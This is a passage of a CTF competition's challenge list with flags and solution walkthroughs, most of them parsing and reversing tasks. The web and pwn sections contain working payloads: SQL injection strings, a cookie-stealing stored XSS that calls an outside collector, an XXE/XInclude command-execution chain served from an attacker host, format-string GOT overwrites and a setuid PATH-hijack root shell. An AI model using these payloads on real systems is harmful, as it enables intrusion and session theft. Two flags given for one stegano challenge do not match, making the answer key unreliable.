Import `textured_output.obj` with `textured_output.mtl` and `textured_output.jpg` into a 3D viewer (e.g., Blender). Orbit the model to see buildings, waterfront, and skyline context.
<br>

#### 2. Identify the location
Use distinctive features (harbor edge, nearby buildings, skyline) to search in online maps/Street View. The scene matches the Helsinki South Harbour waterfront.
<br>

#### 3. Extract coordinates and build the flag
Gather the matching point’s coordinates and round to 4 decimals:
```
CSCTF{60.1618,24.9395}
```
<br>



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> VulnDB

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{CVE-2021-44228-10.0}`<br>
> **Deployment:** `dynamic`<br>
> **Scoring:** max 200, decay 50, min 50


---

### Overview

#### Challenge Brief
You're investigating a critical remote code execution in a widely used Java logging library disclosed in December 2021 and nicknamed "Log4Shell".
Find its official CVE entry on the National Vulnerability Database (NVD).
On that NVD page, read the CVSS v3.1 Base Score.
Submit both values in the flag.
Example: `CSCTF{CVE-2019-40401-5.0}`

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
No downloadable files.

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Search the NVD.
2. Read the Base Score.
3. Build the flag.

#### 1. Search the NVD
Look up "Log4Shell NVD" → CVE-2021-44228.
<br>

#### 2. Read the Base Score
On the NVD page, CVSS v3.1 Base Score is **10.0**.
<br>

#### 3. Build the flag
```
CSCTF{CVE-2021-44228-10.0}
```
<br>



<br>
<br>

---

# 🚩 PROGRAMMING 🚩

## <span style="color:#1E88E5">&#9679;</span> Intreview-1

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{p@rS3_0f_Th3_LOG}`<br>
> **Deployment:** `docker`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
Programming – Level 1 (CLF logs).
Select level 1 after connecting; between `BEGIN/END` you get Common Log Format lines.
Sum BYTES where METHOD=`GET`, PATH starts with `/api/v1/`, and status is 200.
Reply the decimal sum.

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
No downloadable files.

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Connect, select level 1, and read the CLF block.
2. Sum BYTES for GETs under `/api/v1/` with status 200.
3. Send the decimal sum and receive the flag.

#### 1. Connect and read the CLF block
```bash
python3 exploit.py <host> <port>
```
Script flow:
- Connect via TCP, send `1\n` to pick level 1.
- Read until `BEGIN`/`END` block is fully received.
<br>

#### 2. Sum the matching entries
```python
CLF = r'^(\d+\.\d+\.\d+\.\d+) - - \[(.+?)\] "([A-Z]+) (/[^\s]*) HTTP/1\.1" (\d{3}) (\d+)$'
total = 0
for line in block.splitlines():
    m = re.match(CLF, line)
    if not m: continue
    method, path, status, size = m.group(3), m.group(4), int(m.group(5)), int(m.group(6))
    if method == "GET" and path.startswith("/api/v1/") and status == 200:
        total += size
```
<br>

#### 3. Submit the sum
```python
s.sendall(f"{total}\n".encode())
print(s.recv(4096).decode(), end="")
```
Example flag for the given instance:
```
CSCTF{p@rS3_0f_Th3_LOG}
```
<br>



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> Intreview-2

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{#y3s_one_n0_2_No_z$r0}`<br>
> **Deployment:** `docker`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
Programming – Level 2 (XOR bytes).
Same container; pick level 2.
Input: `BYTES: aa-bb-cc-...` (lowercase hex, dash-separated).
XOR all bytes and return exactly two lowercase hex digits plus newline.

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
No downloadable files.

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Connect, pick level 2, and read the hex bytes.
2. XOR all bytes together.
3. Send the result as a two-digit lowercase hex string.

#### 1. Connect and read the bytes
```python
s.recv(4096)
s.sendall(b"2\n")
buf=b""
while b"Answer:" not in buf:
    buf+=s.recv(4096)
line=buf.decode().split("BYTES: ",1)[1].split("\n",1)[0].strip()
```
<br>

#### 2. XOR all values
```python
x=0
for b in line.split("-"):
    x ^= int(b,16)
```
<br>

#### 3. Send the answer
```python
s.sendall(f"{x:02x}\n".encode())
print(s.recv(4096).decode(), end="")
```
Flag for this level:
```
CSCTF{#y3s_one_n0_2_No_z$r0}
```
<br>



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> Intreview-3

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{@ss3mBle33333}`<br>
> **Deployment:** `docker`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
Programming – Level 3 (Base64 reassembly).
Same container; pick level 3.
Between `BEGIN/END` you get parts like `i/N:BASE64` out of order.
Sort by `i`, Base64-decode each chunk, concatenate bytes, interpret as ASCII, send plaintext plus newline.

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
No downloadable files.

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Connect, pick level 3, and collect all fragment lines.
2. Sort fragments by index and Base64-decode in order.
3. Send the reassembled plaintext to get the flag.

#### 1. Collect the fragments
```python
s.recv(4096)
s.sendall(b"3\n")
buf=b""
while b"Answer:" not in buf: buf+=s.recv(8192)
lines = buf.decode().split("BEGIN\n",1)[1].split("\nEND",1)[0].strip().splitlines()
parts=[]
for L in lines:
    idx,b64 = L.split(":",1)
    i,_N = map(int, idx.split("/"))
    parts.append((i, b64))
```
<br>

#### 2. Reassemble in order
```python
parts.sort(key=lambda t:t[0])
msg = b"".join(base64.b64decode(b, validate=False) for _, b in parts).decode()
```
<br>

#### 3. Send the plaintext
```python
s.sendall((msg+"\n").encode())
print(s.recv(4096).decode(), end="")
```
Flag:
```
CSCTF{@ss3mBle33333}
```
<br>



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> Intreview-4

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{MC_@utH}`<br>
> **Deployment:** `docker`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
Programming – Level 4 (HMAC).
Same container; pick level 4.
You receive `key=... token=... salt=...`.
Compute `HMAC-SHA256(key, token||salt)` (plain concat), return lowercase hex digest (64 chars) plus newline.

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
No downloadable files.

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Connect, pick level 4, and read the HMAC inputs.
2. Compute HMAC-SHA256 over `token+salt` with the given key.
3. Send the hex digest.

#### 1. Read key, token, and salt
```python
s.recv(4096)
s.sendall(b"4\n")
buf=b""
while b"Answer:" not in buf: buf+=s.recv(4096)
line=[L for L in buf.decode().splitlines() if L.startswith("key=")][0]
kv=dict(p.split("=",1) for p in line.split())
```
<br>

#### 2. Compute the MAC
```python
mac = hmac.new(kv["key"].encode(), (kv["token"]+kv["salt"]).encode(), hashlib.sha256).hexdigest()
```
<br>

#### 3. Send the digest
```python
s.sendall((mac+"\n").encode())
print(s.recv(4096).decode(), end="")
```
Flag:
```
CSCTF{MC_@utH}
```
<br>



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> Intreview-5

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{JWt_@uTh3nt1c2tI0n_3XtR@cT!0n}`<br>
> **Deployment:** `docker`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
Programming – Level 5 (JWT signature only).
Same container; pick level 5.
You get `secret=...` and `header=...`, `payload=...` (base64url, no padding).
Compute `signature = base64url( HMAC-SHA256(secret, header + "." + payload) )` without padding. Return signature plus newline.

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
No downloadable files.

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Connect, pick level 5, and read the JWT parts plus shared secret.
2. Compute the HS256 signature for `header.payload`.
3. Send the Base64url signature.

#### 1. Read JWT data and secret
```python
s.recv(4096)
s.sendall(b"5\n")
buf=b""
while b"Answer (signature):" not in buf: buf+=s.recv(8192)
txt=buf.decode().splitlines()
secret = next(L.split("=",1)[1] for L in txt if L.startswith("secret="))
header = next(L.split("=",1)[1] for L in txt if L.startswith("header="))
payload = next(L.split("=",1)[1] for L in txt if L.startswith("payload="))
```
<br>

#### 2. Compute HS256 signature
```python
sig = base64.urlsafe_b64encode(
    hmac.new(secret.encode(), f"{header}.{payload}".encode(), hashlib.sha256).digest()
).rstrip(b"=").decode()
```
<br>

#### 3. Send the signature
```python
s.sendall((sig+"\n").encode())
print(s.recv(4096).decode(), end="")
```
Flag:
```
CSCTF{JWt_@uTh3nt1c2tI0n_3XtR@cT!0n}
```
<br>



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> Intreview-6

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{TL5_scr33n1ng_@}`<br>
> **Deployment:** `docker`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
Programming – Level 6 (Binary TLV).
Same container; pick level 6.
You get a hex blob for a TLV stream. Each record: type(1) len(2, big-endian) value(len).
For type=0x42, value is `[index(1)][len(1)][data(len)]`. Extract all type-0x42 records, sort by index ascending, concatenate data, decode as ASCII, and send the resulting string plus a newline.

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
No downloadable files.

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Connect, pick level 6, and read the TLV hex blob.
2. Parse TLV entries; collect fragments from tag 0x42.
3. Concatenate fragments in order and send the decoded string.

#### 1. Read the TLV hex
```python
s.recv(4096)
s.sendall(b"6\n")
buf=b""
while b"Answer:" not in buf: buf+=s.recv(8192)
hexstr = [L.split("HEX: ",1)[1] for L in buf.decode().splitlines() if L.startswith("HEX: ")][0]
data = bytes.fromhex(hexstr)
```
<br>

#### 2. Parse and gather fragments
```python
import struct
pos=0; frags={}
while pos < len(data):
    t = data[pos]; l = struct.unpack("!H", data[pos+1:pos+3])[0]
    v = data[pos+3:pos+3+l]; pos += 3+l
    if t == 0x42 and len(v) >= 2:
        idx = v[0]; ln = v[1]
        frags[idx] = v[2:2+ln]
```
<br>

#### 3. Reassemble and send
```python
out = b"".join(frags[i] for i in sorted(frags))
s.sendall((out.decode()+"\n").encode())
print(s.recv(4096).decode(), end="")
```
Flag:
```
CSCTF{TL5_scr33n1ng_@}
```
<br>



<br>
<br>

---

# 🚩 PWN 🚩

## <span style="color:#1E88E5">&#9679;</span> Blic

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{ret2libc_in_the_big_twentyfive}`<br>
> **Deployment:** `docker`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
A minimal C service on a tiny appliance. Something as simple as printing user input might give you the leverage you need.

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
No downloadable files.

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Recon the service and binary.
2. Leak libc and calculate base.
3. Pivot to ret2libc and read the flag.

#### 1. Recon the service and binary
- Pull the binary from the container (or provided files) and run `checksec`.
- Identify the format string vulnerability in the printf of user input.
- Note the available GOT entries and libc version (from shipped libc).
<br>

#### 2. Leak libc and calculate base
- Use a `%p` spray to find the stack offset where controlled format arguments land.
- Leak a libc address via `%<idx>$s` or `%<idx>$p` pointing to a GOT entry (e.g., `puts@GOT`).
- Compute `libc_base = leak - libc.symbols['puts']`.
<br>

#### 3. Pivot to ret2libc
- Compute `system = libc_base + libc.symbols['system']` and find `"/bin/sh"` in libc.
- Craft a second-stage payload using pwntools `fmtstr_payload` to overwrite a GOT entry (e.g., `printf@GOT`) with `system`.
- Send `/bin/sh` so the overwritten GOT entry calls `system("/bin/sh")`.
- Read the flag with `cat /flag.txt`.

Drop a solver in `dev/assets/solve.py` based on your leaked offsets; adjust offsets and GOT targets to match the downloaded binary/libc.



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> Print

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{printf_go_brrrrrr}`<br>
> **Deployment:** `docker`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
A small print service running in a container. It echoes user input and keeps a flag nearby—figure out how to make it reveal it.

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
- `files/print_togive.zip`

#### Hints
- **Hint 1** (cost 10)
  First hint. Costs 10 points.
<br>

- **Hint 2** (cost 20)
  Second hint. Costs 20 points.
<br>


---

### Solution Walkthrough

1. Trigger the format string to leak libc.
2. Compute libc base and overwrite `printf@GOT` with `system`.
3. Send `/bin/sh` to get a shell and read the flag.

#### 1. Leak libc via format string
- Connect to the service (`nc <host> 1337` or see `dev/assets/solve.py`).
- Use a `%p` spray (e.g., `%20$p`) to leak a return address from libc.
- Use a format-string write to repoint a GOT entry back to `vuln` for a second round (the provided solver does this automatically).
<br>

#### 2. Calculate libc base and overwrite GOT
- From the leaked libc address, subtract the known offset to get `libc_base`.
- Compute `system = libc_base + offset_system`.
- Use `fmtstr_payload` (pwntools) to overwrite `printf@GOT` with `system`.
<br>

#### 3. Get shell and read flag
- Send `/bin/sh` as the next input; it is passed to `system`.
- In the shell, read the flag:
```bash
cat /flag.txt
```

Helper script: `dev/assets/solve.py` automates leak → calc → GOT overwrite → shell.
<br>



<br>
<br>

---

# 🚩 REV 🚩

## <span style="color:#1E88E5">&#9679;</span> Chrono-key

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{This_was_fun_huh}`<br>
> **Deployment:** `dynamic`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
How bad could have we distorted the source?
I donno, just see for yourself.

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
- `files/challenge`

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Extract the PyInstaller bundle to recover code/assets.
2. Decompile the Python bytecode and find the argument derivation.
3. Recreate the argument locally, run the binary, and read the flag.

#### 1. Extract the bundle
```bash
python3 pyinstxtractor.py challenge
# yields challenge_extracted/ with challenge.pyc, table.bin, chronos_kronos.png, blob.json
```
<br>

#### 2. Decompile and inspect
Decompile `challenge.pyc` (pylingual.io/decompyle3). The script:
- Computes `CRC32(png)` and `SHA1(table.bin)`, mixes with a pepper, then `SHA256`, Base32 (strip `=`) → expected argument.
- Derives an AES-GCM key via `scrypt(arg, salt, N=2**18, r=8, p=1, dklen=32)` and decrypts `blob.json`. Only the correct argument prints the flag.
<br>

#### 3. Recreate the argument and run
Use a helper (in `dev/assets/solve.md`) or:
```python
import zlib,hashlib,base64
PEPPER=b"Croissant-CTF-2025"
png=open("chronos_kronos.png","rb").read()
tbl=open("table.bin","rb").read()
crc=(zlib.crc32(png)&0xFFFFFFFF).to_bytes(4,"big")
sha1=hashlib.sha1(tbl).digest()
arg=base64.b32encode(hashlib.sha256(crc+sha1+PEPPER).digest()).decode().rstrip("=")
print(arg)
```
Run the binary with the derived argument:
```bash
./challenge <argument>
# prints: CSCTF{This_was_fun_huh}
```



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> Covert

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{w3b_l0c@l_0nly_5elf_d3str0y}`<br>
> **Deployment:** `dynamic`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
It is always to make sure you don't execute code you didn't write.
But this is a safe environment, of course you can trust this covert operation.
Nothing else should start running, I swear!

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
- `files/webnote`

#### Hints
- **Hint 1** (cost 10)
  Do you see any other processes that started or ports that opened?
<br>


---

### Solution Walkthrough

1. Run the binary to start its listeners.
2. Find the localhost ports it opened.
3. Query both and read the flag from the hidden one.

#### 1. Run the binary
```bash
chmod +x webnote
./webnote &
```
<br>

#### 2. Find the listeners
```bash
ss -tlnp | grep -w webnote || lsof -nP -iTCP -sTCP:LISTEN | grep -w webnote
```
You should see two localhost ports bound by `webnote`.
<br>

#### 3. Query the ports
```bash
curl -i http://127.0.0.1:<portA>/
curl -i http://127.0.0.1:<portB>/
```
One serves a warning page; the other returns the flag directly:
```
CSCTF{w3b_l0c@l_0nly_5elf_d3str0y}
```
<br>



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> Ransom

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{be_c4r3ful_an4lys1ng_rans0mw4re}`<br>
> **Deployment:** `dynamic`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
A suspicious "ransomware" sample captured before it ran. Reverse it to prove whether the threat is real and recover the flag.

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
No downloadable files.

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Extract the PyInstaller bundle to get `ransom.pyc`.
2. Decompile the Python bytecode to inspect the crypto logic.
3. Read the hardcoded password/flag: `CSCTF{be_c4r3ful_an4lys1ng_rans0mw4re}`.

#### 1. Extract the bundle
```bash
python3 pyinstxtractor.py ransom.exe
# yields ransom.exe_extracted/ with ransom.pyc and support files
```
<br>

#### 2. Decompile the bytecode
Use `pycdc` or pylingual.io on `ransom.pyc`. The decompiled script shows PBKDF2/AES functions and a hardcoded password.
<br>

#### 3. Read the flag
In the decompiled code:
```python
password = 'CSCTF{be_c4r3ful_an4lys1ng_rans0mw4re}'
```
No real encryption happens; the "ransom" password is the flag.
<br>



<br>
<br>

---

# 🚩 SANITY CHECK 🚩

## <span style="color:#1E88E5">&#9679;</span> Rules

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{s0rry_bu+_y0u_n33d_+0_ch3ck_+h3_rul3s}`<br>
> **Deployment:** `dynamic`<br>
> **Scoring:** max 200, decay 0, min 200


---

### Overview

#### Challenge Brief
Have you read the official rules?
C'mon, you got to read the rules!

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
No downloadable files.

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Open the rules page.
2. Read the flag.

#### 1. Open the rules page
Visit:
```
https://2025.chronos-security.ro/rules
```
<br>

#### 2. Read the flag
Displayed on the page:
```
CSCTF{s0rry_bu+_y0u_n33d_+0_ch3ck_+h3_rul3s}
```
<br>



<br>
<br>

---

# 🚩 STEGANO 🚩

## <span style="color:#1E88E5">&#9679;</span> Specter

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{simple_spectrogram}`<br>
> **Deployment:** `dynamic`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
Are you on the same frequency as me?
I can't hear you! Answer already!

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
- `files/audio.wav`

#### Hints
- **Hint 1** (cost 10)
  You can use a tool like Audacity to analyze the spectre of frequencies.
<br>


---

### Solution Walkthrough

1. Open the provided audio in a spectrogram view.
2. Inspect the frequency plot for visible text.
3. Read the embedded flag.

#### 1. Open the spectrogram
```bash
audacity files/audio.wav &
# View → Spectrogram → Spectrogram Settings (adjust range/resolution if needed)
```
<br>

#### 2. Inspect the frequency plot
Zoom horizontally; the spectrogram shows clear text drawn in the frequency domain.
<br>

#### 3. Read the flag
The spectrogram reveals:
```
CSCTF{c@nt_y0u_h34r_7h3_f473s}
```
<br>



<br>
<br>

---

# 🚩 WEB 🚩

## <span style="color:#1E88E5">&#9679;</span> Abnormalized

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{haNdl3_abN0rm@l_paY10@ds}`<br>
> **Deployment:** `docker`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
What does the admin say? 👀

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
No downloadable files.

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Post with a normalized double-quote to sneak in SQL.
2. Note the GUID returned for your injected post.
3. View the post to trigger the UNION and leak the flag.

#### 1. Post with a normalized double-quote to sneak in SQL
The name filter blocks ASCII quotes, but it normalizes later with NFKC. Send a name starting with a full-width quote `＂` so it becomes `"` after normalization, re-opening the SQL. Example:
```http
POST /post HTTP/1.1
Host: challenge
Content-Type: application/x-www-form-urlencoded

name=%EF%BC%82+UNION+SELECT+guid%2C+author%2C+content+FROM+posts+WHERE+author%3D%27admin%27+--&content=hi
```
The payload is: `＂ UNION SELECT guid, author, content FROM posts WHERE author='admin' --`
<br>

#### 2. Note the GUID returned for your injected post
The server responds with a "View" link containing a GUID. Copy that GUID value; it identifies the row your injected query will return.
<br>

#### 3. View the post to trigger the UNION and leak the flag
Open `/view/<encoded name>?guid=<that-guid>`, e.g.:
```
/view/%EF%BC%82%20UNION%20SELECT%20guid%2C%20author%2C%20content%20FROM%20posts%20WHERE%20author%3D'admin'%20--?guid=<guid>
```
The UNIONed row is shown as the post content, revealing the admin’s secret:
```
CSCTF{haNdl3_abN0rm@l_paY10@ds}
```
<br>



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> Chatbot-1

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{r0le_manag3d_vi4_localStorage_1s_b4d}`<br>
> **Deployment:** `docker`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief


**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
No downloadable files.

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Register or log in, then elevate yourself to admin on the client.
2. Trigger the admin flow to load the hidden page.
3. Read the flag from the admin view.

#### 1. Register or log in and elevate
- Register any user with the **name** `JViGXHBEPkE` (client JS maps that to admin), or log in with any account.
- Open DevTools → Application → Local Storage → `currentUser` and edit the JSON: set `"role":"admin"` (or add it).
<br>
<br>

#### 2. Trigger the admin flow
Refresh the page; the admin branch calls `loadPage()` and redirects to the hidden HTML.
<br>

#### 3. Read the flag
The admin page at `/fb50a39ec931ab211ce6702af2d077c5ec981ec27c18d163.html` shows:
```
CSCTF{r0le_manag3d_vi4_localStorage_1s_b4d}
```
<br>



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> Chatbot-2

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{y0u_c4n7_h1d3_fr0m_1D0R}`<br>
> **Deployment:** `docker`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
Chatbot platform with stored conversations; conversation IDs are exposed indirectly.

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
No downloadable files.

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Log in or register to get a session.
2. Abuse the IDOR on `/load_conversation` by supplying the MD5 of a numeric conversation ID.
3. Read the seeded flag message.

#### 1. Authenticate
Register/login normally so you have the session cookie, then visit `/app`.
<br>

#### 2. Call `/load_conversation` with the flagged ID
- Start a conversation and observe traffic: creation returns an integer ID, but `/load_conversation` uses an MD5-looking string → `conversation_id = md5(<numeric_id>)`.
- A seeded entry with the flag uses `md5("9") = 45c48cce2e2d7fbdea1afc51c7c6ad26`.
```bash
curl -X POST -H "Content-Type: application/json" -b cookies.txt \
  -d '{"conversation_id":"45c48cce2e2d7fbdea1afc51c7c6ad26"}' \
  http://<host>:<port>/load_conversation
```
<br>

#### 3. Read the flag
The JSON response includes the message:
```
CSCTF{y0u_c4n7_h1d3_fr0m_1D0R}
```
<br>



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> Chatbot-3

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{H4ck3d_V14_SqL_1nj3ct10n}`<br>
> **Deployment:** `docker`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
Chatbot service storing conversations in SQLite; conversation lookups are not parameterized.

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
No downloadable files.

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Log in or register to get a session.
2. Exploit the SQL injection in `/load_conversation`.
3. Dump messages and read the flag.

#### 1. Authenticate
Register/login and go to `/app` to obtain the session cookie.
<br>

#### 2. Inject via `conversation_id`
`/load_conversation` concatenates `conversation_id` into a query and only strips certain keywords. A simple payload works:
```bash
curl -X POST -H "Content-Type: application/json" -b cookies.txt \
  -d '{"conversation_id":"\' or 1=1--"}' \
  http://<host>:<port>/load_conversation
```
<br>

#### 3. Read the flag
The response returns all messages, including the seeded one:
```
CSCTF{H4ck3d_V14_SqL_1nj3ct10n}
```
<br>



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> Requests

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{0nly_c0UP13_r7que2T2}`<br>
> **Deployment:** `docker`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
Machine-to-machine API that enforces Bearer auth, preconditions, multipart schema, and ETag checks. Craft proper requests (no browser needed) to submit an artifact and manifest, then fetch the flag.
Follow our requests, please.
Just a couple of steps and you'll solve it!

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
No downloadable files.

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Bootstrap an access token.
2. Create a ticket and note `ticket_id`/`ETag`.
3. Read requirements to get the expected bytes (reveals the nonce), then upload artifact+manifest with proper headers.
4. Fetch the flag with the same token.

#### 1. Get a token
```bash
curl -i 'http://<host>:1337/auth/token?flow=bootstrap'
```
Save `access_token` from JSON.
<br>

#### 2. Create a ticket
```bash
curl -i -H "Authorization: Bearer $TOK" \
  -H "Content-Type: application/json" \
  -d '{"component":"api","summary":"test"}' \
  http://<host>:1337/tickets
```
Response JSON gives `ticket_id`; headers include `ETag` and links (including `requirements`).
<br>

#### 3. Read requirements and upload
```bash
curl -i -H "Authorization: Bearer $TOK" \
  http://<host>:1337/tickets/$TID/requirements
```
The JSON includes `artifact.bytes_exact` which already reveals `<tid>:<nonce>`. Build:
```
ticket_id=<tid>
artifact_sha256=<sha256 of artifact bytes>
artifact_size=<len of artifact bytes>
```
Upload with If-Match set to ETag:
```bash
echo -n "$TID:$NONCE" > artifact.txt
SHA=$(sha256sum artifact.txt | cut -d' ' -f1)
cat > manifest.txt <<EOF
ticket_id=$TID
artifact_sha256=$SHA
artifact_size=$(stat -c%s artifact.txt)
EOF
curl -i -H "Authorization: Bearer $TOK" \
  -H "If-Match: \"$ETAG\"" \
  -F "file=@artifact.txt;type=text/plain" \
  -F "manifest=@manifest.txt;type=text/plain; charset=utf-8" \
  http://<host>:1337/upload/$TID
```
<br>

#### 4. Retrieve the flag
```bash
curl -i -H "Authorization: Bearer $TOK" \
  -H "Accept: application/json" \
  "http://<host>:1337/flag?ticket=$TID"
```
JSON contains:
```
CSCTF{0nly_c0UP13_r7que2T2}
```
<br>



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> The Box

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{WhY_50_M4NY_57EP5???/?!?!!?!?}`<br>
> **Deployment:** `docker`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
Your commander orders you to seize full control of a hostile lab network codenamed "The box."
Intel says it’s segmented, lightly monitored, and hiding a single file that proves dominance `/root/flag.txt`.
Your mission: breach, root, extract.

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
No downloadable files.

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Recover credentials by deobfuscating the front-end JS.
2. Log in as admin (or steal the cookie via stored XSS) to reach the XML interface.
3. Use XXE/XInclude to execute commands as www-data.
4. Leverage the setuid `diag` binary to pop a root shell and read `/root/flag.txt`.

#### 1. Recover creds
`static/main.js` is JSFuck-obfuscated; run it through a JSFuck deobfuscator (eval off) to reveal hardcoded creds:
```
user: admin
pass: Admin#202555555555555@W@#@##@!
```
Alternatively, the admin bot auto-logins and visits messages, so a stored XSS (`<input autofocus onfocus="new Image().src='https://burp-collab/?c='+document.cookie">`) can steal the session cookie.
<br>

#### 2. Access admin XML upload
Log in as admin → `/admin/xml`. The app expects an XML with `<cmd>` containing an external `xi:include`.
<br>

#### 3. XXE/XInclude RCE
Host payloads on your box (172.17.0.1 example):
`payload.dtd`:
```dtd
<!ENTITY run "bash -c 'echo pwnd >/tmp/pwned'">
```
`frag.xml`:
```xml
<!DOCTYPE z [
  <!ENTITY % d SYSTEM "http://172.17.0.1:1337/payload.dtd">
  %d;
]>
<z>&run;</z>
```
Submit:
```xml
<task xmlns:xi="http://www.w3.org/2001/XInclude">
  <cmd>
    <xi:include href="http://172.17.0.1:1337/frag.xml" parse="xml"/>
  </cmd>
</task>
```
The server fetches and inlines the external DTD, resolving `&run;` as a shell command.
<br>

#### 4. Escalate to root and read flag
Drop a shim to hijack the setuid `diag` binary:
```bash
echo -e '#!/bin/sh\nexec /bin/sh -p' > /tmp/iptables
chmod +x /tmp/iptables
export PATH=/tmp:$PATH
/usr/local/bin/diag
cat /root/flag.txt
```
`/usr/local/bin/diag` runs as root and invokes `iptables` from `PATH`, yielding a root shell.



<br>
<br>
